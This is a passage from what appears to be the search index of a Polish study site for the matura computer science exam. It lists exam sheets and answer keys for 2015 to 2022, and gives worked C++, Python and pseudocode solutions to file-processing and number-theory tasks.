II</p> <p> Dane</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2015/#odpowiedzi","title":"Odpowiedzi","text":"<p> Cz\u0119\u015b\u0107 I - klucz</p> <p> Cz\u0119\u015b\u0107 II - klucz</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2015/solutions/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2015/solutions/#czesc-ii","title":"Cz\u0119\u015b\u0107 II","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2015/solutions/#zadanie-4","title":"Zadanie 4","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2015/solutions/#rozwiazanie-c","title":"Rozwi\u0105zanie C++","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n\nusing namespace std;\n\nconst int N = 1000;\n\nint zliczZnak(string txt, char znak) {\n    int wynik = 0;\n    for(int i = 0; i &lt; txt.size(); i++) {\n        if(txt[i] == znak) {\n            wynik++;\n        }\n    }\n\n    return wynik;\n}\n\nint zad1(string dane[]) {\n    int wynik = 0;\n    for(int i = 0; i &lt; N; i++) {\n        if(zliczZnak(dane[i], '0') &gt; (dane[i].size() / 2)) {\n            wynik++;\n        }\n    }\n\n    return wynik;\n}\n\nvoid wczytajDane(string dane[]) {\n    ifstream danePlik(\"liczby.txt\");\n\n    for(int i = 0; i &lt; N; i++) {\n        danePlik &gt;&gt; dane[i];\n    }\n\n    danePlik.close();\n}\n\nint zad2PodzielnePrzez2(string dane[]) {\n    int wynik = 0;\n    for(int i = 0; i &lt; N; i++) {\n        if(dane[i][dane[i].size() - 1] == '0') {\n            wynik++;\n        }\n    }\n\n    return wynik;\n}\n\nint zad2PodzielnePrzez8(string dane[]) {\n    int wynik = 0;\n    for(int i = 0; i &lt; N; i++) {\n        if(dane[i].size() &gt; 3 &amp;&amp; dane[i].substr(dane[i].size() - 3, 3) == \"000\") {\n            wynik++;\n        }\n\n    }\n\n    return wynik;\n}\n\nint zad3Najmniejsza(string dane[]) {\n    string minLiczba = dane[0];\n    int minIndeks = 0;\n\n    for(int i = 1; i &lt; N; i++) {\n        if((dane[i].size() &lt; minLiczba.size()) || (dane[i].size() == minLiczba.size() &amp;&amp; dane[i] &lt; minLiczba)) {\n            minLiczba = dane[i];\n            minIndeks = i;\n        }\n    }\n\n    return minIndeks + 1;\n}\n\nint zad3Najwieksza(string dane[]) {\n    string maksLiczba = dane[0];\n    int maksIndeks = 0;\n\n    for(int i = 1; i &lt; N; i++) {\n        if((dane[i].size() &gt; maksLiczba.size()) || (dane[i].size() == maksLiczba.size() &amp;&amp; dane[i] &gt; maksLiczba)) {\n            maksLiczba = dane[i];\n            maksIndeks = i;\n        }\n    }\n\n    return maksIndeks + 1;\n}\n\nint main() {\n    string binarna;\n    string dane[N];\n    ofstream wynikPlik(\"wynik4.txt\");\n\n    wczytajDane(dane);\n\n    wynikPlik &lt;&lt; \"Zad 4.1\" &lt;&lt; endl;\n    wynikPlik &lt;&lt; zad1(dane) &lt;&lt; endl &lt;&lt; endl;\n\n    wynikPlik &lt;&lt; \"Zad 4.2\" &lt;&lt; endl;\n    wynikPlik &lt;&lt; \"Podzielne przez 2: \" &lt;&lt; zad2PodzielnePrzez2(dane) &lt;&lt; endl;\n    wynikPlik &lt;&lt; \"Podzielne przez 8: \" &lt;&lt; zad2PodzielnePrzez8(dane) &lt;&lt; endl &lt;&lt; endl;\n\n    wynikPlik &lt;&lt; \"Zad4.3\" &lt;&lt; endl;\n    wynikPlik &lt;&lt; \"Najmniejsza: \" &lt;&lt; zad3Najmniejsza(dane) &lt;&lt; endl;\n    wynikPlik &lt;&lt; \"Najwieksza: \" &lt;&lt; zad3Najwieksza(dane) &lt;&lt; endl;\n\n    wynikPlik.close();\n    return 0;\n} \n</code></pre>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2015/solutions/#zadanie-5","title":"Zadanie 5","text":"<p> Excel</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2015/solutions/#zadanie-6","title":"Zadanie 6","text":"<p> Access</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2016/","title":"2016","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2016/#arkusze","title":"Arkusze","text":"<p> Cz\u0119\u015b\u0107 I</p> <p> Cz\u0119\u015b\u0107 II</p> <p></p> <p> Dane</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2016/#odpowiedzi","title":"Odpowiedzi","text":"<p> Klucz</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2016/solutions/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2016/solutions/#czesc-ii","title":"Cz\u0119\u015b\u0107 II","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2016/solutions/#zadanie-4","title":"Zadanie 4","text":"<p> Excel</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2016/solutions/#zadanie-5","title":"Zadanie 5","text":"<p> Access</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2017/","title":"2017","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2017/#arkusze","title":"Arkusze","text":"<p> Cz\u0119\u015b\u0107 I</p> <p> Cz\u0119\u015b\u0107 II</p> <p> Dane</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2017/#odpowiedzi","title":"Odpowiedzi","text":"<p> Klucz</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2017/solutions/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2017/solutions/#czesc-i","title":"Cz\u0119\u015b\u0107 I","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2017/solutions/#zadanie-1","title":"Zadanie 1","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2017/solutions/#12","title":"1.2","text":"<pre><code>1. maks1 := 0\n2. maks2 := 0\n3. Od i = 1 do n, wykonuj:\n    4. Je\u017celi A[i] &gt; maks1 oraz (A[i] mod p) == 0, to:\n        5. maks1 := A[i]\n    6. Je\u017celi A[i] &gt; maks2 oraz (A[i] mod p) != 0 oraz A[i] != maks1, to:\n        7. maks2 := A[i]\n\n8. S := maks1 * maks2\n9. Zwr\u00f3\u0107 S   \n</code></pre>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2017/solutions/#czesc-ii","title":"Cz\u0119\u015b\u0107 II","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2017/solutions/#zadanie-4","title":"Zadanie 4","text":"<p> Excel</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2017/solutions/#zadanie-5","title":"Zadanie 5","text":"<p> Access</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2017-czerwiec-cke/","title":"Czerwiec 2017","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2017-czerwiec-cke/#arkusze","title":"Arkusze","text":"<p> Cz\u0119\u015b\u0107 I</p> <p> Cz\u0119\u015b\u0107 II</p> <p> Dane</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2017-czerwiec-cke/#odpowiedzi","title":"Odpowiedzi","text":"<p> Klucz</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2017-czerwiec-cke/solutions/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2017-czerwiec-cke/solutions/#zadanie-6","title":"Zadanie 6","text":"<p> Rozwi\u0105zanie - Access</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2017-czerwiec-cke/solutions/#61","title":"6.1","text":"<p>https://jmp.sh/GlKxweAj</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2017-czerwiec-cke/solutions/#62","title":"6.2","text":"<p>https://jmp.sh/zoaF8LXH</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2017-czerwiec-cke/solutions/#63","title":"6.3","text":"<p>https://jmp.sh/CiYMnqG3</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2017-czerwiec-cke/solutions/#64","title":"6.4","text":"<p>https://jmp.sh/pfHglAZ1</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2017-czerwiec-cke/solutions/#65","title":"6.5","text":"<p>https://jmp.sh/AuUTLwMV</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2018/","title":"2018","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2018/#arkusze","title":"Arkusze","text":"<p> Cz\u0119\u015b\u0107 I</p> <p> Cz\u0119\u015b\u0107 II</p> <p> Dane</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2018/#odpowiedzi","title":"Odpowiedzi","text":"<p> Odpowiedzi</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2018/solutions/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2018/solutions/#czesc-ii","title":"Cz\u0119\u015b\u0107 II","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2018/solutions/#zadanie-6","title":"Zadanie 6","text":"<p> Access</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2019/","title":"2019","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2019/#arkusze","title":"Arkusze","text":"<p> Cz\u0119\u015b\u0107 I</p> <p> Cz\u0119\u015b\u0107 II</p> <p> Dane</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2019/#odpowiedzi","title":"Odpowiedzi","text":"<p> Klucz</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2019/solutions/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2019/solutions/#czesc-ii","title":"Cz\u0119\u015b\u0107 II","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2019/solutions/#zadanie-6","title":"Zadanie 6","text":"<p> Access</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2020/","title":"2020","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2020/#arkusze","title":"Arkusze","text":"<p> Cz\u0119\u015b\u0107 I</p> <p> Cz\u0119\u015b\u0107 II</p> <p> Dane</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2020/#odpowiedzi","title":"Odpowiedzi","text":"<p> Klucz</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2020/solutions/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2020/solutions/#czesc-ii","title":"Cz\u0119\u015b\u0107 II","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2020/solutions/#zadanie-5","title":"Zadanie 5","text":"<p> Access</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2020-probna-cke/","title":"2020 - pr\u00f3bna cke","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2020-probna-cke/#arkusze","title":"Arkusze","text":"<p> Cz\u0119\u015b\u0107 I</p> <p> Cz\u0119\u015b\u0107 II</p> <p> Dane</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2020-probna-cke/#odpowiedzi","title":"Odpowiedzi","text":"<p> Klucz</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2020-probna-cke/solutions/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2020-probna-cke/solutions/#czesc-i","title":"Cz\u0119\u015b\u0107 I","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2020-probna-cke/solutions/#zadanie-2","title":"Zadanie 2","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2020-probna-cke/solutions/#22","title":"2.2","text":"<pre><code>1. czestosci := tablica o rozmiarze [1..n] wype\u0142niona warto\u015bciami 0\n2. Dla i := 1 do n, wykonuj:\n  3. liczba := T[i]\n  4. Dla j := 1 do n, wykonuj:\n     5. Je\u017celi T[j] = liczba, to:\n        6. czestosci[i] := czestosci[i]+1\n\n7. maks := czestosci[1]\n8. maks_ind := 1  \n9. Dla i := 1 do n, wykonuj:\n  10. Je\u017celi czestosci[i] &gt; maks, to:\n     11. maks := czestosci[i]\n     12. maks_ind := i\n\n13. Wypisz T[maks_ind]\n</code></pre> <pre><code>1. maks := 0\n2. moda := 0\n3. Dla i := 1 do n, wykonuj:\n   4. liczba := T[i]\n   5. czestosc := 0\n   6. Dla j := 1 do n, wykonuj:\n      7. Je\u017celi T[j] = liczba, to:\n         8. czestosc := czestosc + 1\n\n   9. Je\u017celi czestosc &gt; maks, to:\n      10. maks := czestosc\n      11. moda := liczba\n\n12. Wypisz moda\n</code></pre>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2020-probna-cke/solutions/#czesc-ii","title":"Cz\u0119\u015b\u0107 II","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2020-probna-cke/solutions/#zadanie-4","title":"Zadanie 4","text":"<p>TODO</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2020-probna-cke/solutions/#zadanie-5","title":"Zadanie 5","text":"<p>TODO</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2020-probna-cke/solutions/#zadanie-6","title":"Zadanie 6","text":"<p> Rozwi\u0105zanie - Access</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2021/","title":"2021","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2021/#arkusze","title":"Arkusze","text":"<p> Cz\u0119\u015b\u0107 I</p> <p> Cz\u0119\u015b\u0107 II</p> <p> Dane</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2021/#odpowiedzi","title":"Odpowiedzi","text":"<p> Klucz</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2021/solutions/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2021/solutions/#czesc-i","title":"Cz\u0119\u015b\u0107 I","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2021/solutions/#zadanie-1","title":"Zadanie 1","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2021/solutions/#11","title":"1.1","text":"<p>a) najmniejsza = 5555</p> <p>b) najwi\u0119ksza = 8999</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2021/solutions/#12","title":"1.2","text":"<pre><code>funkcja dopelnienie(n):\n1. d := 0\n2. mn := 1\n3. Dop\u00f3ki n &gt; 0, wykonuj:\n    4. cyfra := n mod 10\n    5. n := n div 10\n    6. cyfra := 9 - cyfra\n    7. d := d + cyfra * mn\n    8. mn := mn * 10\n9. Zwr\u00f3\u0107 d \n</code></pre>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2021/solutions/#czesc-ii","title":"Cz\u0119\u015b\u0107 II","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2021/solutions/#zadanie-4","title":"Zadanie 4","text":"<p>TODO</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2021/solutions/#zadanie-5","title":"Zadanie 5","text":"<p> Rozwi\u0105zanie - Excel</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2021/solutions/#zadanie-6","title":"Zadanie 6","text":"<p> Rozwi\u0105zanie - Access</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2021-probna-cke/","title":"2021 - pr\u00f3bna CKE","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2021-probna-cke/#arkusze","title":"Arkusze","text":"<p> Cz\u0119\u015b\u0107 I</p> <p> Cz\u0119\u015b\u0107 II</p> <p> Dane</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2021-probna-cke/#odpowiedzi","title":"Odpowiedzi","text":"<p> Klucz</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2022/","title":"2022","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2022/#arkusze","title":"Arkusze","text":"<p> Cz\u0119\u015b\u0107 I</p> <p> Cz\u0119\u015b\u0107 II</p> <p> Dane</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2022/#odpowiedzi","title":"Odpowiedzi","text":"<p> Klucz</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2022/solutions/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2022/solutions/#zadanie-1","title":"Zadanie 1","text":"<p>TODO</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2022/solutions/#zadanie-2","title":"Zadanie 2","text":"<p>TODO</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2022/solutions/#zadanie-3","title":"Zadanie 3","text":"<p>TODO</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2022/solutions/#zadanie-4","title":"Zadanie 4","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2022/solutions/#41","title":"4.1","text":"Python <pre><code>with open(\"liczby.txt\") as input_file:\n  input_list = input_file.read().split()\n\nresult = 0\nfirst = \"\"\n\nfor el in input_list:\n  if el[0] == el[-1]:\n    result += 1\n    if first == \"\":\n      first = el\n\nprint(result, first)\n</code></pre>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2022/solutions/#42","title":"4.2","text":"Python <pre><code>def compute_prime_factors(number):\n  prime = 2\n  result = []\n  while number &gt; 1:\n    if number % prime == 0:\n      number //= prime\n      result.append(prime)\n    else:\n      prime += 1\n\n  return result\n\nwith open(\"liczby.txt\") as input_file:\n  numbers_list = list(map(int, input_file.read().split()))\n\nmax_prime_factors = 0\nmax_prime_factors_number = 0\n\nmax_unique_prime_factors = 0\nmax_unique_prime_factors_number = 0\n\nfor number in numbers_list:\n  prime_factors_list = compute_prime_factors(number)\n  prime_factors_set = set(prime_factors_list)\n\n  prime_factors_count = len(prime_factors_list)\n  unique_prime_factors_count = len(prime_factors_set)\n\n  if prime_factors_count &gt; max_prime_factors:\n    max_prime_factors = prime_factors_count\n    max_prime_factors_number = number\n\n  if unique_prime_factors_count &gt; max_unique_prime_factors:\n    max_unique_prime_factors = unique_prime_factors_count\n    max_unique_prime_factors_number = number\n\nprint(max_prime_factors_number, max_prime_factors, max_unique_prime_factors_number, max_unique_prime_factors)\n</code></pre>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2022/solutions/#43","title":"4.3","text":"<p>TODO</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2022/solutions/#zadanie-5","title":"Zadanie 5","text":"<p>TODO</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2022/solutions/#zadanie-6","title":"Zadanie 6","text":"<p>TODO</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2022-probna-cke/","title":"2022 pr\u00f3bna CKE","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2022-probna-cke/#arkusz","title":"Arkusz","text":"<p> Arkusz</p> <p> Dane</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2022-probna-cke/#odpowiedzi","title":"Odpowiedzi","text":"<p> Klucz</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2022-probna-cke/solutions/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2022-probna-cke/solutions/#zadanie-1","title":"Zadanie 1","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2022-probna-cke/solutions/#11","title":"1.1","text":"C++Python <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n\nusing namespace std;\n\nint main() {\n    string data;\n    ifstream file(\"mecz.txt\");\n    file &gt;&gt; data;\n    file.close();\n\n    int result = 0;\n    for (int i = 1; i &lt; data.length(); i++)\n    {\n        if (data[i] != data[i - 1])\n        {\n            result++;\n        }\n    }\n\n    cout &lt;&lt; \"Zadanie 1.1\" &lt;&lt; endl;\n    cout &lt;&lt; \"Wynik: \" &lt;&lt; result &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre> <p>Zaczynamy od wczytania zawarto\u015bci pliku do zmiennej typu string. Nast\u0119pnie przechodzimy przez kolejne elementy ci\u0105gu, poczynaj\u0105c od drugiego znaku. W p\u0119tli por\u00f3wnujemy obecny znak z poprzednim i zwi\u0119kszamy wynik o 1, je\u015bli znaki s\u0105 r\u00f3\u017cne.</p> <pre><code>with open(\"mecz.txt\") as file:\n    data = file.read().strip()\n\nresult = 0\nfor i in range(1, len(data)):\n    if data[i] != data[i - 1]:\n        result += 1\n\nprint(\"Zadanie 1.1\")\nprint(\"Wynik:\", result)\n</code></pre> <p>Zaczynamy od wczytania zawarto\u015bci pliku do zmiennej. Dane b\u0119d\u0105 wczytane w postaci tekstu (typ <code>str</code>). Na wszelki wypadek usuwamy bia\u0142e znaki z pocz\u0105tku i ko\u0144ca poleceniem <code>strip</code>.</p> <p>Nast\u0119pnie przechodzimy przez kolejne elementy ci\u0105gu, poczynaj\u0105c od drugiego znaku. W p\u0119tli por\u00f3wnujemy obecny znak z poprzednim i zwi\u0119kszamy wynik o 1, je\u015bli znaki s\u0105 r\u00f3\u017cne.</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2022-probna-cke/solutions/#12","title":"1.2","text":"C++Python <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n\nusing namespace std;\n\nint main() {\n    string data;\n    ifstream file(\"mecz.txt\");\n    file &gt;&gt; data;\n    file.close();\n\n    int win_a = 0, win_b = 0, i = 0;\n    while (win_a &lt; 1000 || win_b &lt; 1000 || abs(win_a - win_b) &lt; 3)\n    {\n        if (data[i] == 'A')\n        {\n            win_a++;\n        }\n        else\n        {\n            win_b++;\n        }\n\n        i++;\n    }\n\n    cout &lt;&lt; \"Zadanie 1.2\" &lt;&lt; endl;\n    if (win_a &gt; win_b)\n    {\n        cout &lt;&lt; \"Wygrala druzyna A\" &lt;&lt; endl;\n    }\n    else\n    {\n        cout &lt;&lt; \"Wygrala druzyna B\" &lt;&lt; endl;\n    }\n\n    cout &lt;&lt; \"Wynik A: \" &lt;&lt; win_a &lt;&lt; endl;\n    cout &lt;&lt; \"Wynik B: \" &lt;&lt; win_b &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre> <pre><code>with open(\"mecz.txt\") as file:\n    data = file.read().strip()\n\nwin_a = 0\nwin_b = 0\ni = 0\nwhile win_a &lt; 1000 or win_b &lt; 1000 or abs(win_a - win_b) &lt; 3:\n    if data[i] == \"A\":\n        win_a += 1\n    else:\n        win_b += 1\n\n    i += 1\n\nprint(\"Zadanie 1.2\")\nif win_a &gt; win_b:\n    print(\"Wygra\u0142a dru\u017cyna A\")\nelse:\n    print(\"Wygra\u0142a dru\u017cyna B\")\nprint(\"Wynik A:\", win_a)\nprint(\"Wynik B:\", win_b)\n</code></pre>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2022-probna-cke/solutions/#13","title":"1.3","text":"C++Python <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n\nusing namespace std;\n\nint main() {\n    string data;\n    ifstream file(\"mecz.txt\");\n    file &gt;&gt; data;\n    file.close();\n\n    int result = 0, current_length = 0, max_length = 0;\n    char current_symbol = ' ', max_symbol = ' ';\n\n    for (auto el : data)\n    {\n        if (el == current_symbol)\n        {\n            current_length++;\n        }\n        else\n        {\n            current_symbol = el;\n            current_length = 1;\n        }\n\n        if (current_length &gt; max_length)\n        {\n            max_length = current_length;\n            max_symbol = current_symbol;\n        }\n\n        if (current_length == 10)\n        {\n            result++;\n        }\n    }\n\n    cout &lt;&lt; \"Zadanie 1.3\" &lt;&lt; endl;\n    cout &lt;&lt; \"Laczna liczba dobrych pass: \" &lt;&lt; result &lt;&lt; endl;\n    cout &lt;&lt; \"Najdluzsza dobra passa: \" &lt;&lt; max_length;\n    cout &lt;&lt; \", Druzyna: \" &lt;&lt; max_symbol &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre> <pre><code>with open(\"mecz.txt\") as file:\n    data = file.read().strip()    \n\nresult = 0\ncurrent_symbol = \"\"\ncurrent_length = 0\nmax_length = 0\nmax_symbol = \"\"\n\nfor el in data:\n    if current_symbol == el:\n        current_length += 1\n    else:\n        current_length = 1\n        current_symbol = el\n\n    if current_length &gt; max_length:\n        max_length = current_length\n        max_symbol = el\n\n    if current_length == 10:\n        result += 1\n\nprint(\"Zadanie 1.3\")\nprint(\"\u0141\u0105czna liczba dobrych pass:\", result)\nprint(\"Najd\u0142u\u017csza dobra passa:\", max_length, \"Dru\u017cyna:\", max_symbol)\n</code></pre>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2022-probna-cke/solutions/#zadanie-3","title":"Zadanie 3","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2022-probna-cke/solutions/#32","title":"3.2","text":"C++Python <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n\nusing namespace std;\n\nbool is_prime(int n) {\n    if (n &lt; 2) {\n        return false;\n    }\n\n    for(int i = 2; i * i &lt;= n; i++) {\n        if (n % i == 0) {\n            return false;\n        }\n    }\n\n    return true;\n}\n\nint main() {\nifstream file(\"liczby.txt\");\nint data[100];\nfor(int i = 0; i &lt; 100; i++) {\n    file &gt;&gt; data[i];\n}\n\nfile.close();\n\nint result = 0;\n\nfor(auto number : data) {\n    if(is_prime(number - 1)) {\n        result++;\n    } \n}\n\ncout &lt;&lt; \"Zadanie 3.2\" &lt;&lt; endl;\ncout &lt;&lt; result &lt;&lt; endl;\nreturn 0;\n}\n</code></pre> <pre><code>def is_prime(n):\n    if n &lt; 2:\n        return False\n\n    i = 2\n    while i * i &lt;= n:\n        if n % i == 0:\n            return False\n\n        i += 1\n\n    return True\n\nwith open(\"liczby.txt\") as file:\n    data = [int(line) for line in file]\n\nresult = 0\nfor number in data:\n    if is_prime(number - 1):\n        result += 1\n\nprint(\"Zadanie 3.2\")\nprint(result)\n</code></pre>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2022-probna-cke/solutions/#33","title":"3.3","text":"C++Python <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n\nusing namespace std;\n\nbool is_prime(int n) {\n    if (n &lt; 2) {\n        return false;\n    }\n\n    for(int i = 2; i * i &lt;= n; i++) {\n        if (n % i == 0) {\n            return false;\n        }\n    }\n\n    return true;\n}\n\nint main() {\nifstream file(\"liczby.txt\");\nint data[100];\nfor(int i = 0; i &lt; 100; i++) {\n    file &gt;&gt; data[i];\n}\n\nfile.close();\n\nint min_number = 0, min_value = 1000000, max_number = 0, max_value = 0;\n\nbool primes[1000001] = {};\nfor(int i = 2; i &lt; 1000001; i++) {\n    primes[i] = is_prime(i);\n}\n\nfor(auto number : data) {\n    int counter = 0;\n    for(int i = 2; i &lt;= number / 2; i++) {\n        if(primes[i] &amp;&amp; primes[number - i]) {\n            counter++;\n        }\n    }\n\n    if(counter &gt; max_value) {\n        max_value = counter;\n        max_number = number;\n    } else if(counter &lt; min_value) {\n        min_value = counter;\n        min_number = number;\n    }\n}\n\ncout &lt;&lt; \"Zadanie 3.3\" &lt;&lt; endl;\ncout &lt;&lt; max_number &lt;&lt; \" \" &lt;&lt; max_value &lt;&lt; endl;\ncout &lt;&lt; min_number &lt;&lt; \" \" &lt;&lt; min_value &lt;&lt; endl;\nreturn 0;\n}\n</code></pre> <pre><code>def is_prime(n):\n    if n &lt; 2:\n        return False\n\n    i = 2\n    while i * i &lt;= n:\n        if n % i == 0:\n            return False\n\n        i += 1\n\n    return True\n\nwith open(\"liczby.txt\") as file:\n    data = [int(line) for line in file]\n\nmin_number = 0\nmin_value = 1000000\nmax_number = 0\nmax_value = 0\n\nprimes = [is_prime(i) for i in range(1000001)]\n\nfor number in data:\n    counter = 0\n    for i in range(2, number // 2 + 1):\n        if primes[i] and primes[number - i]:\n            counter += 1\n\n    if counter &lt; min_value:\n        min_value = counter\n        min_number = number\n    elif counter &gt; max_value:\n        max_value = counter\n        max_number = number\n\nprint(\"Zadanie 3.3\")\nprint(max_number, max_value)\nprint(min_number, min_value)\n</code></pre>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2022-probna-cke/solutions/#34","title":"3.4","text":"C++Python <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;map&gt;\n#include &lt;iomanip&gt;\n#include &lt;sstream&gt;\n\nusing namespace std;\n\nint main() {\nifstream file(\"liczby.txt\");\nint data[100];\nfor(int i = 0; i &lt; 100; i++) {\n    file &gt;&gt; data[i];\n}\n\nfile.close();\n\nmap&lt;char, int&gt; hex_map;\n\nfor(auto number : data) {\n    stringstream stream;\n    stream &lt;&lt; hex &lt;&lt; number;\n    string hex_str(stream.str());\n    for(auto el : hex_str) {\n        hex_map[el]++;\n    }\n}\n\ncout &lt;&lt; \"Zadanie 3.4\" &lt;&lt; endl;\nfor(char c = '0'; c &lt;= '9'; c++) {\n    cout &lt;&lt; c &lt;&lt; \": \" &lt;&lt; hex_map[c] &lt;&lt; endl;\n}\n\nfor(char c = 'a'; c &lt;= 'f'; c++) {\n    cout &lt;&lt; c &lt;&lt; \": \" &lt;&lt; hex_map[c] &lt;&lt; endl;\n}\n\nreturn 0;\n}\n</code></pre> <pre><code>with open(\"liczby.txt\") as file:\n    data = [int(line) for line in file]\n\nhex_dict = {hex(i)[2:]:0 for i in range(16)}\n\nfor number in data:\n    hex_str = hex(number)[2:]\n    for el in hex_str:\n        hex_dict[el] += 1\n\nprint(\"Zadanie 3.4\")\nfor el in 